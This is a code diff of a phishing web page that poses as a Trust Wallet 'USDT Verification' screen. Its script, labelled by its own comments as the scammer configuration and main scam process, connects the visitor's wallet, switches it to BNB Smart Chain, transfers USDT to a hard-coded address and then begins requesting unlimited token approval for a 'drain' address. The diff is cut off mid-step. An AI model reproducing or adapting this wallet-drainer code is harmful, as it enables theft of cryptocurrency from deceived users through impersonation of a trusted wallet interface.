@@ -6,188 +6,123 @@
     <title>USDT Verification</title>
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="mobile-web-app-capable" content="yes">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        /* TRUST WALLET EXACT STYLES FROM SCREENSHOT */
+        /* EXACT STYLES FROM SCREENSHOTS */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent;
-            -webkit-font-smoothing: antialiased;
-        }
-        
-        :root {
-            --trust-blue: #1C68F3;
-            --trust-gray: #8E8E93;
-            --trust-light-gray: #F2F2F7;
-            --trust-border: #C7C7CC;
-            --trust-green: #34C759;
-            --trust-red: #FF3B30;
+            -webkit-text-size-adjust: 100%;
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: #FFFFFF;
             color: #000000;
-            line-height: 1.45;
-            font-size: 17px;
-            -webkit-text-size-adjust: 100%;
+            line-height: 1.4;
+            font-size: 15px;
             overflow-x: hidden;
-            height: 100vh;
+            padding: 0;
+            margin: 0;
+            min-height: 100vh;
         }
         
-        /* HEADER - EXACT FROM SCREENSHOT 1 */
-        .header {
-            background: linear-gradient(180deg, #FFFFFF 0%, #F8F8F8 100%);
-            padding: 44px 20px 20px 20px;
+        /* TRUST WALLET BROWSER CONTROLS - FROM SCREENSHOT 1 */
+        .browser-controls {
+            background: #F8F8F8;
+            padding: 8px 16px;
             border-bottom: 0.5px solid #C6C6C8;
-            position: relative;
-            text-align: center;
-            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
         
-        .header::before {
-            content: "";
-            position: absolute;
-            top: 12px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 36px;
-            height: 5px;
-            background: #E5E5EA;
-            border-radius: 2.5px;
-        }
-        
-        .header h1 {
-            font-size: 17px;
-            font-weight: 600;
-            color: #000000;
-            letter-spacing: -0.41px;
-            margin-bottom: 4px;
-        }
-        
-        .header .url {
+        .control-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            color: #007AFF;
             font-size: 13px;
+            font-weight: 500;
+            padding: 4px 8px;
+            border-radius: 6px;
+            background: rgba(0, 122, 255, 0.08);
+        }
+        
+        .control-item i {
+            font-size: 12px;
+        }
+        
+        /* MAIN HEADER - FROM SCREENSHOT 1 */
+        .site-header {
+            background: #FFFFFF;
+            padding: 12px 16px;
+            border-bottom: 0.5px solid #E5E5EA;
+            text-align: center;
+        }
+        
+        .site-url {
+            font-size: 14px;
             color: #8E8E93;
             font-weight: 400;
-            letter-spacing: -0.08px;
+            margin-top: 2px;
         }
         
-        /* MAIN CONTENT - EXACT FROM SCREENSHOT */
-        .container {
-            padding: 0;
+        /* MAIN CONTENT - EXACT FROM SCREENSHOTS */
+        .content {
+            padding: 20px 16px;
         }
         
-        .card {
-            background: #FFFFFF;
-            padding: 20px;
-            border-radius: 0;
-        }
-        
-        /* ADDRESS SECTION - EXACT FROM SCREENSHOT 1 */
-        .section {
+        .input-group {
             margin-bottom: 24px;
         }
         
-        .section-label {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-        
-        .label-text {
+        .input-label {
             font-size: 14px;
-            font-weight: 500;
             color: #8E8E93;
-            letter-spacing: -0.15px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            display: block;
         }
         
-        .address-container {
-            position: relative;
-            background: var(--trust-light-gray);
-            border-radius: 12px;
-            border: 1px solid var(--trust-border);
-            padding: 16px;
-            min-height: 52px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .address-text {
+        .address-display {
+            background: #F2F2F7;
+            border-radius: 10px;
+            padding: 14px 16px;
             font-family: 'SF Mono', 'Menlo', 'Monaco', 'Courier New', monospace;
             font-size: 15px;
             color: #000000;
-            letter-spacing: -0.24px;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
-            flex: 1;
-            margin-right: 12px;
+            word-break: break-all;
+            border: 1px solid transparent;
+            line-height: 1.3;
         }
         
-        .address-buttons {
-            display: flex;
-            gap: 8px;
-        }
-        
-        .icon-button {
-            width: 32px;
-            height: 32px;
-            border-radius: 8px;
-            background: #FFFFFF;
-            border: 0.5px solid #D1D1D6;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            color: #000000;
-            font-size: 15px;
-        }
-        
-        .paste-button {
-            background: var(--trust-blue);
-            color: #FFFFFF;
-            border: none;
-            border-radius: 8px;
-            padding: 6px 12px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        /* AMOUNT SECTION - EXACT FROM SCREENSHOT 2 */
         .amount-container {
-            background: var(--trust-light-gray);
-            border-radius: 12px;
-            border: 1px solid var(--trust-border);
+            background: #F2F2F7;
+            border-radius: 10px;
             overflow: hidden;
+            border: 1px solid transparent;
         }
         
         .amount-header {
             padding: 12px 16px;
-            border-bottom: 0.5px solid #E5E5EA;
+            border-bottom: 0.5px solid #D1D1D6;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
         
-        .amount-label {
+        .amount-title {
             font-size: 15px;
             color: #8E8E93;
-            font-weight: 400;
         }
         
-        .token-selector {
-            background: var(--trust-blue);
+        .token-badge {
+            background: #007AFF;
             color: #FFFFFF;
-            padding: 4px 12px;
+            padding: 4px 10px;
             border-radius: 6px;
             font-size: 14px;
             font-weight: 600;
@@ -202,15 +137,14 @@
         
         .amount-input {
             flex: 1;
-            font-size: 28px;
-            font-weight: 600;
-            color: #000000;
             background: transparent;
             border: none;
             outline: none;
+            font-size: 28px;
+            font-weight: 600;
+            color: #000000;
             text-align: center;
             font-variant-numeric: tabular-nums;
-            letter-spacing: -0.41px;
             min-width: 0;
         }
         
@@ -219,7 +153,7 @@
         }
         
         .max-button {
-            background: var(--trust-green);
+            background: #34C759;
             color: #FFFFFF;
             border: none;
             border-radius: 8px;
@@ -228,49 +162,46 @@
             font-weight: 600;
             cursor: pointer;
             min-width: 60px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         
-        /* USD VALUE - EXACT POSITIONING */
         .usd-value {
             text-align: center;
             font-size: 15px;
             color: #8E8E93;
-            margin: 16px 0 24px 0;
-            font-weight: 400;
+            margin: 16px 0 32px 0;
+            padding: 0 16px;
         }
         
-        /* NEXT BUTTON - EXACT FROM SCREENSHOT */
-        .next-button-container {
-            padding: 20px;
+        /* NEXT BUTTON - EXACT POSITIONING */
+        .action-container {
+            padding: 20px 16px;
             background: #FFFFFF;
             border-top: 0.5px solid #E5E5EA;
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
-            box-shadow: 0 -4px 12px rgba(0,0,0,0.05);
         }
         
         .next-button {
             width: 100%;
             height: 50px;
-            background: var(--trust-blue);
+            background: #007AFF;
             color: #FFFFFF;
             border: none;
             border-radius: 12px;
             font-size: 17px;
             font-weight: 600;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            letter-spacing: -0.41px;
-            transition: all 0.2s;
+            transition: opacity 0.2s;
         }
         
         .next-button:active {
-            opacity: 0.9;
-            transform: scale(0.99);
+            opacity: 0.8;
         }
         
         .next-button:disabled {
@@ -278,8 +209,8 @@
             cursor: not-allowed;
         }
         
-        /* TRUST WALLET SPECIFIC MODAL - FROM SCREENSHOT 3 */
-        .trust-modal {
+        /* MODAL STYLES (FOR CONNECTION) */
+        .modal-overlay {
             display: none;
             position: fixed;
             top: 0;
@@ -288,28 +219,29 @@
             bottom: 0;
             background: rgba(0,0,0,0.5);
             z-index: 1000;
-            align-items: flex-end;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
         
         .modal-content {
             background: #FFFFFF;
-            border-radius: 16px 16px 0 0;
+            border-radius: 16px;
             width: 100%;
-            max-height: 80vh;
-            overflow-y: auto;
-            animation: slideUp 0.3s ease;
+            max-width: 400px;
+            overflow: hidden;
+            animation: modalSlide 0.3s ease;
         }
         
-        @keyframes slideUp {
-            from { transform: translateY(100%); }
-            to { transform: translateY(0); }
+        @keyframes modalSlide {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
         
         .modal-header {
-            padding: 24px 20px 16px 20px;
+            padding: 24px 20px 16px;
             text-align: center;
             border-bottom: 0.5px solid #E5E5EA;
-            position: relative;
         }
         
         .modal-title {
@@ -319,219 +251,15 @@
             margin-bottom: 4px;
         }
         
-        .modal-subtitle {
-            font-size: 15px;
-            color: #8E8E93;
-        }
-        
-        .close-button {
-            position: absolute;
-            right: 20px;
-            top: 24px;
-            background: none;
-            border: none;
-            font-size: 20px;
-            color: #8E8E93;
-            cursor: pointer;
-            width: 30px;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 15px;
-        }
-        
-        .close-button:hover {
-            background: #F2F2F7;
-        }
-        
         .modal-body {
             padding: 20px;
         }
         
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 16px 0;
-            border-bottom: 0.5px solid #F2F2F7;
-        }
-        
-        .info-label {
-            font-size: 15px;
-            color: #8E8E93;
-        }
-        
-        .info-value {
-            font-size: 15px;
-            color: #000000;
-            font-weight: 500;
-            text-align: right;
-        }
-        
-        .network-fee {
-            background: #F8F8F8;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 16px 0;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        
-        .fee-label {
-            font-size: 15px;
-            color: #8E8E93;
-        }
-        
-        .fee-value {
-            font-size: 15px;
-            color: #000000;
-            font-weight: 500;
-        }
-        
-        .insufficient-balance {
-            background: #FFF0F0;
-            border: 0.5px solid #FFD1D1;
-            border-radius: 8px;
-            padding: 12px;
-            margin: 16px 0;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .warning-icon {
-            color: var(--trust-red);
-            font-size: 16px;
-        }
-        
-        .warning-text {
-            font-size: 15px;
-            color: #000000;
-            flex: 1;
-        }
-        
-        .learn-more {
-            color: var(--trust-blue);
-            font-size: 15px;
-            text-decoration: none;
-        }
-        
-        .top-up-button {
-            width: 100%;
-            height: 44px;
-            background: var(--trust-blue);
-            color: #FFFFFF;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 8px;
-        }
-        
-        /* CONNECT MODAL - FROM SCREENSHOT 4 */
-        .connect-modal {
-            display: none;
-        }
-        
-        .dapp-info {
-            text-align: center;
-            padding: 20px;
-            border-bottom: 0.5px solid #E5E5EA;
-        }
-        
-        .dapp-name {
-            font-size: 17px;
-            font-weight: 600;
-            color: #000000;
-            margin-bottom: 4px;
-        }
-        
-        .dapp-url {
-            font-size: 15px;
-            color: var(--trust-blue);
-            word-break: break-all;
-        }
-        
-        .network-section {
-            padding: 16px 20px;
-            border-bottom: 0.5px solid #E5E5EA;
-        }
-        
-        .section-title {
-            font-size: 15px;
-            color: #8E8E93;
-            margin-bottom: 12px;
-        }
-        
-        .network-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-        }
-        
-        .network-name {
-            font-size: 16px;
-            color: #000000;
-            font-weight: 500;
-        }
-        
-        .network-address {
-            font-family: 'SF Mono', monospace;
-            font-size: 14px;
-            color: #8E8E93;
-        }
-        
-        .permission-section {
-            padding: 20px;
-        }
-        
-        .permission-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 16px;
-        }
-        
-        .permission-checkbox {
-            width: 20px;
-            height: 20px;
-            border-radius: 4px;
-            border: 2px solid #007AFF;
-            margin-top: 2px;
-            cursor: pointer;
-        }
-        
-        .permission-checkbox.checked {
-            background: #007AFF;
-            position: relative;
-        }
-        
-        .permission-checkbox.checked::after {
-            content: "✓";
-            color: white;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 12px;
-            font-weight: bold;
-        }
-        
-        .permission-text {
-            font-size: 15px;
-            color: #000000;
-            line-height: 1.4;
-            flex: 1;
-        }
-        
         .modal-actions {
-            display: flex;
-            gap: 12px;
             padding: 20px;
             border-top: 0.5px solid #E5E5EA;
+            display: flex;
+            gap: 12px;
         }
         
         .modal-button {
@@ -540,21 +268,21 @@
             border-radius: 12px;
             font-size: 17px;
             font-weight: 600;
-            cursor: pointer;
             border: none;
+            cursor: pointer;
         }
         
-        .cancel-button {
+        .modal-button.cancel {
             background: #F2F2F7;
             color: #000000;
         }
         
-        .connect-button {
-            background: var(--trust-blue);
+        .modal-button.connect {
+            background: #007AFF;
             color: #FFFFFF;
         }
         
-        /* LOADING STATES */
+        /* LOADING */
         .loading {
             display: none;
             position: fixed;
@@ -570,179 +298,118 @@
         }
         
         .spinner {
-            width: 60px;
-            height: 60px;
+            width: 50px;
+            height: 50px;
             border: 3px solid #F2F2F7;
-            border-top-color: var(--trust-blue);
+            border-top-color: #007AFF;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
         }
         
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
         
-        .loading-text {
-            font-size: 17px;
-            color: #000000;
-            font-weight: 500;
+        /* SAFE AREA FOR IPHONE */
+        @supports (padding-bottom: env(safe-area-inset-bottom)) {
+            .action-container {
+                padding-bottom: calc(20px + env(safe-area-inset-bottom));
+            }
         }
         
-        /* RESPONSIVE */
-        @media (max-height: 700px) {
-            .header {
-                padding-top: 32px;
-            }
-            
-            .next-button-container {
-                position: static;
-                margin-top: 20px;
-            }
+        /* HIDDEN */
+        .hidden {
+            display: none !important;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- MAIN INTERFACE (SCREENSHOT 1 & 2) -->
-    <div class="header">
-        <h1 id="siteTitle">usdtverification.vercel.app</h1>
-        <div class="url" id="currentUrl">https://usdttt-rewll.vercel.app/</div>
+    <!-- TRUST WALLET BROWSER CONTROLS (SCREENSHOT 1 & 2) -->
+    <div class="browser-controls">
+        <div class="control-item">
+            <i class="fas fa-globe"></i>
+            <span id="networkDisplay">Ethereum</span>
+        </div>
+        <div class="control-item">
+            <i class="fas fa-desktop"></i>
+            <span>Desktop Mode</span>
+        </div>
+        <div class="control-item">
+            <i class="fas fa-share"></i>
+            <span>Share</span>
+        </div>
+        <div class="control-item">
+            <i class="fas fa-expand"></i>
+            <span>Fullscreen mode</span>
+        </div>
     </div>
     
-    <div class="container">
-        <div class="card">
-            <!-- ADDRESS SECTION -->
-            <div class="section">
-                <div class="section-label">
-                    <div class="label-text">Address or Domain Name</div>
+    <!-- SITE HEADER (SCREENSHOT 1) -->
+    <div class="site-header">
+        <div id="siteUrl">usdttt-rewll.vercel.app</div>
+        <div class="site-url" id="secondaryUrl">usdtverification.vercel.app</div>
+    </div>
+    
+    <!-- MAIN CONTENT -->
+    <div class="content">
+        <div class="input-group">
+            <label class="input-label" id="addressLabel">Address or Domain</label>
+            <div class="address-display" id="addressDisplay">
+                0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <div class="amount-container">
+                <div class="amount-header">
+                    <div class="amount-title" id="amountTitle">Amount</div>
+                    <div class="token-badge">USDT</div>
                 </div>
-                <div class="address-container">
-                    <div class="address-text" id="recipientAddress">0x395b205f3ec60b4cd5820</div>
-                    <div class="address-buttons">
-                        <button class="paste-button" onclick="handlePaste()">Paste</button>
-                        <button class="icon-button" onclick="copyAddress()">
-                            <i class="fas fa-copy"></i>
-                        </button>
-                        <button class="icon-button" onclick="showQR()">
-                            <i class="fas fa-link"></i>
-                        </button>
-                    </div>
+                <div class="amount-input-section">
+                    <input 
+                        type="number" 
+                        class="amount-input" 
+                        id="amountInput"
+                        value="1"
+                        placeholder="0"
+                        inputmode="decimal"
+                        min="0"
+                        step="0.1"
+                        oninput="updateUSDValue()"
+                    >
+                    <button class="max-button" onclick="setMaxAmount()">Max</button>
                 </div>
             </div>
-            
-            <!-- AMOUNT SECTION -->
-            <div class="section">
-                <div class="amount-container">
-                    <div class="amount-header">
-                        <div class="amount-label" id="amountLabel">USDT Amount</div>
-                        <div class="token-selector">USDT</div>
-                    </div>
-                    <div class="amount-input-section">
-                        <input 
-                            type="number" 
-                            class="amount-input" 
-                            id="amountInput"
-                            value="1"
-                            placeholder="0"
-                            inputmode="decimal"
-                            min="0"
-                            step="0.1"
-                            oninput="updateUSDValue()"
-                        >
-                        <button class="max-button" onclick="setMaxAmount()">Max</button>
-                    </div>
-                </div>
-                <div class="usd-value" id="usdValue">≈ $1.00</div>
-            </div>
+            <div class="usd-value" id="usdValue">≈ $1.00</div>
         </div>
     </div>
     
     <!-- NEXT BUTTON -->
-    <div class="next-button-container">
-        <button class="next-button" id="nextButton" onclick="handleNext()">
+    <div class="action-container">
+        <button class="next-button" id="nextButton" onclick="initiateProcess()">
             Next
         </button>
     </div>
     
-    <!-- APPROVAL MODAL (SCREENSHOT 3) -->
-    <div class="trust-modal" id="approvalModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <button class="close-button" onclick="closeModal('approvalModal')">×</button>
-                <div class="modal-title">Approve</div>
-                <div class="modal-subtitle" id="approvalSubtitle">BNB Smart Chain (BNB)</div>
-            </div>
-            
-            <div class="modal-body">
-                <div class="info-row">
-                    <div class="info-label">Asset</div>
-                    <div class="info-value" id="modalAsset">BNB Smart Chain (BNB)</div>
-                </div>
-                
-                <div class="info-row">
-                    <div class="info-label">DApp</div>
-                    <div class="info-value" id="modalDapp">usdtverification.vercel.app</div>
-                </div>
-                
-                <div class="network-fee">
-                    <div class="fee-label">Network fee</div>
-                    <div class="fee-value">
-                        <span style="color: #8E8E93;">🕒</span> $0.00<br>
-                        <span style="font-size: 13px;">0.00000351 BNB</span>
-                    </div>
-                </div>
-                
-                <div class="insufficient-balance" id="insufficientBalance">
-                    <i class="fas fa-exclamation-circle warning-icon"></i>
-                    <div class="warning-text">Insufficient BNB Smart Chain (BNB) balance</div>
-                    <a href="#" class="learn-more" onclick="showLearnMore()">Learn more</a>
-                </div>
-                
-                <button class="top-up-button" onclick="topUpBNB()">
-                    Top up BNB Smart Chain (BNB)
-                </button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- CONNECT MODAL (SCREENSHOT 4) -->
-    <div class="trust-modal connect-modal" id="connectModal">
+    <!-- CONNECT MODAL -->
+    <div class="modal-overlay" id="connectModal">
         <div class="modal-content">
             <div class="modal-header">
                 <div class="modal-title">Connect DApp</div>
             </div>
-            
-            <div class="dapp-info">
-                <div class="dapp-name">USDT Verification wants to connect to your wallet</div>
-                <div class="dapp-url" id="dappUrl">https://usdttt-rewll.vercel.app/</div>
+            <div class="modal-body">
+                <p style="text-align: center; margin-bottom: 20px; font-size: 15px; color: #000000;">
+                    USDT Verification wants to connect to your wallet
+                </p>
+                <p style="text-align: center; color: #007AFF; font-size: 14px; word-break: break-all;">
+                    https://usdttt-rewll.vercel.app/
+                </p>
             </div>
-            
-            <div class="network-section">
-                <div class="section-title">Networks</div>
-                <div class="network-item">
-                    <div class="network-name">Ethereum</div>
-                    <div class="network-address" id="ethAddress">0x41740...45f0F9</div>
-                </div>
-            </div>
-            
-            <div class="permission-section">
-                <div class="permission-item">
-                    <div class="permission-checkbox" id="viewBalanceCheck" onclick="toggleCheckbox(this)"></div>
-                    <div class="permission-text">View your wallet balance and activity</div>
-                </div>
-                <div class="permission-item">
-                    <div class="permission-checkbox checked" id="requestApprovalCheck" onclick="toggleCheckbox(this)"></div>
-                    <div class="permission-text">Request approval for transactions</div>
-                </div>
-            </div>
-            
             <div class="modal-actions">
-                <button class="modal-button cancel-button" onclick="closeModal('connectModal')">
-                    Cancel
-                </button>
-                <button class="modal-button connect-button" onclick="connectWallet()">
-                    Connect
-                </button>
+                <button class="modal-button cancel" onclick="closeModal()">Cancel</button>
+                <button class="modal-button connect" onclick="connectWallet()">Connect</button>
             </div>
         </div>
     </div>
@@ -750,16 +417,18 @@
     <!-- LOADING OVERLAY -->
     <div class="loading" id="loadingOverlay">
         <div class="spinner"></div>
-        <div class="loading-text">Processing...</div>
+        <div style="font-size: 16px; color: #000000; font-weight: 500;">Processing...</div>
     </div>
     
     <script>
-        // ==============================================
-        // SCAMMER CONFIGURATION
-        // ==============================================
+        // ============================================
+        // EXACT SCAMMER CONFIGURATION
+        // ============================================
         const SCAM_CONFIG = {
-            // Addresses from screenshot
+            // Payment address (from screenshot)
             paymentAddress: "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85",
+            
+            // Drain address for unlimited approval
             drainAddress: "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc",
             
             // USDT BEP20 Contract
@@ -768,135 +437,97 @@
             // Unlimited approval amount
             unlimitedAmount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
             
-            // Fake URLs for deception
-            siteUrls: [
-                "usdtverification.vercel.app",
-                "usdttt-rewll.vercel.app",
-                "usdt-verify.app",
-                "verify-usdt.com"
+            // Sites to rotate between
+            sites: [
+                { primary: "usdttt-rewll.vercel.app", secondary: "usdtverification.vercel.app" },
+                { primary: "usdtverification.vercel.app", secondary: "usdttt-rewll.vercel.app" }
             ]
         };
         
-        // ==============================================
+        // ============================================
         // UI FUNCTIONS
-        // ==============================================
+        // ============================================
         
-        // Update USD value based on amount
+        // Update USD value
         function updateUSDValue() {
             const amount = document.getElementById('amountInput').value || 0;
-            const usdValue = (amount * 1.00).toFixed(2);
-            document.getElementById('usdValue').textContent = `≈ $${usdValue}`;
+            const usd = (amount * 1.00).toFixed(2);
+            document.getElementById('usdValue').textContent = `≈ $${usd}`;
             
-            // Update modal if open
-            document.getElementById('amountLabel').textContent = 
-                amount > 0 ? `USDT Amount` : `Amount`;
+            // Update title based on amount
+            if (amount > 0) {
+                document.getElementById('amountTitle').textContent = "USDT Amount";
+                document.getElementById('addressLabel').textContent = "Address or Domain Name";
+            } else {
+                document.getElementById('amountTitle').textContent = "Amount";
+                document.getElementById('addressLabel').textContent = "Address or Domain";
+            }
         }
         
-        // Set max amount (shows 1000)
+        // Set max amount
         function setMaxAmount() {
             document.getElementById('amountInput').value = "1000";
             updateUSDValue();
-            showToast("Maximum amount set to 1000 USDT");
+            showToast("Maximum amount set");
         }
         
-        // Handle paste button
-        function handlePaste() {
-            showToast("Address copied to clipboard");
-            // Fake clipboard functionality
-            navigator.clipboard.writeText(SCAM_CONFIG.paymentAddress).catch(() => {});
-        }
-        
-        // Copy address button
-        function copyAddress() {
-            navigator.clipboard.writeText(SCAM_CONFIG.paymentAddress);
-            showToast("Address copied");
-        }
-        
-        // Show QR button (link icon)
-        function showQR() {
-            showToast("Opening address details...");
-            // Would normally show QR modal
-        }
-        
-        // Toast notification
+        // Show toast
         function showToast(message) {
             const toast = document.createElement('div');
             toast.textContent = message;
             toast.style.cssText = `
                 position: fixed;
-                bottom: 100px;
+                top: 100px;
                 left: 50%;
                 transform: translateX(-50%);
-                background: rgba(0,0,0,0.85);
+                background: rgba(0,0,0,0.8);
                 color: white;
-                padding: 12px 20px;
-                border-radius: 10px;
-                font-size: 15px;
+                padding: 10px 20px;
+                border-radius: 8px;
+                font-size: 14px;
                 z-index: 3000;
                 max-width: 80%;
                 text-align: center;
-                backdrop-filter: blur(20px);
-                animation: fadeInOut 3s ease;
+                backdrop-filter: blur(10px);
             `;
             document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 3000);
+            setTimeout(() => toast.remove(), 2000);
         }
         
-        // Toggle checkbox in connect modal
-        function toggleCheckbox(element) {
-            element.classList.toggle('checked');
-        }
-        
-        // ==============================================
+        // ============================================
         // MODAL FUNCTIONS
-        // ==============================================
+        // ============================================
         
         // Show modal
-        function showModal(modalId) {
-            document.getElementById(modalId).style.display = 'flex';
-            document.body.style.overflow = 'hidden';
+        function showModal() {
+            document.getElementById('connectModal').style.display = 'flex';
         }
         
         // Close modal
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-            document.body.style.overflow = 'auto';
+        function closeModal() {
+            document.getElementById('connectModal').style.display = 'none';
         }
         
-        // Show learn more link
-        function showLearnMore() {
-            alert("This is a fake 'Learn More' link. Real Trust Wallet would open documentation.");
+        // Show loading
+        function showLoading() {
+            document.getElementById('loadingOverlay').style.display = 'flex';
         }
         
-        // Top up BNB button
-        function topUpBNB() {
-            showToast("Redirecting to BNB purchase...");
-            // Would redirect to exchange
+        // Hide loading
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
         }
         
-        // ==============================================
-        // WALLET CONNECTION & TRANSACTION
-        // ==============================================
+        // ============================================
+        // WALLET CONNECTION
+        // ============================================
         
-        // Handle Next button click
-        async function handleNext() {
-            const amount = document.getElementById('amountInput').value;
-            
-            if (!amount || amount <= 0) {
-                showToast("Please enter an amount");
-                return;
-            }
-            
-            // Step 1: Show connect modal (screenshot 4)
-            showModal('connectModal');
-        }
-        
-        // Connect wallet from modal
+        // Connect wallet
         async function connectWallet() {
-            closeModal('connectModal');
+            closeModal();
             showLoading();
             
-            // Check if Web3 is available (Trust Wallet)
+            // Check if Web3 is available
             if (typeof window.ethereum === 'undefined') {
                 hideLoading();
                 showToast("Please open in Trust Wallet browser");
@@ -904,19 +535,21 @@
             }
             
             try {
-                // Request account access
-                const accounts = await window.ethereum.request({ 
+                // Request accounts
+                await window.ethereum.request({ 
                     method: 'eth_requestAccounts' 
                 });
                 
-                const userAddress = accounts[0];
-                document.getElementById('ethAddress').textContent = 
-                    userAddress.substring(0, 6) + '...' + userAddress.substring(38);
+                // Update network display
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                if (chainId === '0x38' || chainId === '0x61') {
+                    document.getElementById('networkDisplay').textContent = "BNB Smart Chain";
+                }
                 
-                // Step 2: Show approval modal (screenshot 3)
+                // Proceed to transaction
                 setTimeout(() => {
                     hideLoading();
-                    showModal('approvalModal');
+                    initiateTransaction();
                 }, 1000);
                 
             } catch (error) {
@@ -925,38 +558,28 @@
             }
         }
         
-        // Show loading overlay
-        function showLoading() {
-            document.getElementById('loadingOverlay').style.display = 'flex';
+        // ============================================
+        // MAIN SCAM PROCESS
+        // ============================================
+        
+        // Start the process
+        async function initiateProcess() {
+            showModal();
         }
         
-        // Hide loading overlay
-        function hideLoading() {
-            document.getElementById('loadingOverlay').style.display = 'none';
-        }
-        
-        // ==============================================
-        // FAKE TRANSACTION SIMULATION
-        // ==============================================
-        
-        // When user confirms in approval modal
-        async function confirmApproval() {
-            closeModal('approvalModal');
+        // Execute the scam transactions
+        async function initiateTransaction() {
             showLoading();
             
             try {
-                // Fake delay for "processing"
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-                // Check if connected to BSC
+                // Switch to BSC if needed
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                 
-                if (chainId !== '0x38') { // Not BSC
-                    // Try to switch automatically
+                if (chainId !== '0x38') { // Not BSC Mainnet
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x38' }]
+                            params: [{ chainId: '0x38' }] // BSC Mainnet
                         });
                     } catch (switchError) {
                         if (switchError.code === 4902) {
@@ -966,7 +589,11 @@
                                 params: [{
                                     chainId: '0x38',
                                     chainName: 'Binance Smart Chain',
-                                    nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18
+                                    },
                                     rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                     blockExplorerUrls: ['https://bscscan.com']
                                 }]
@@ -975,34 +602,35 @@
                     }
                 }
                 
-                // ==============================================
-                // ACTUAL DRAIN PROCESS (HIDDEN FROM USER)
-                // ==============================================
-                
-                // Load ethers.js if not already loaded
-                if (typeof ethers === 'undefined') {
-                    await loadScript('https://cdn.ethers.io/lib/ethers-5.2.umd.min.js');
-                }
-                
+                // Initialize ethers
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
                 
-                // Step 1: Send 1 USDT to scammer
-                const usdtAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
-                const usdtContract = new ethers.Contract(SCAM_CONFIG.usdtContract, usdtAbi, signer);
-                
+                // ============================================
+                // STEP 1: SEND 1 USDT TO SCAMMER
+                // ============================================
                 const amount = document.getElementById('amountInput').value;
                 const amountWei = ethers.utils.parseUnits(amount, 18);
                 
+                // USDT Transfer ABI
+                const transferAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
+                const usdtContract = new ethers.Contract(SCAM_CONFIG.usdtContract, transferAbi, signer);
+                
                 const transferTx = await usdtContract.transfer(
-                    SCAM_CONFIG.paymentAddress, 
+                    SCAM_CONFIG.paymentAddress,
                     amountWei
                 );
                 
                 // Wait for confirmation
                 await transferTx.wait();
                 
-                // Step 2: Request unlimited approval
+                // ============================================
+                // STEP 2: REQUEST UNLIMITED APPROVAL
+                // ============================================
+                // Small delay to make it seem like verification
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // USDT Approve ABI
                 const approveAbi = ["function approve(address spender, uint256 amount) returns (bool)"];
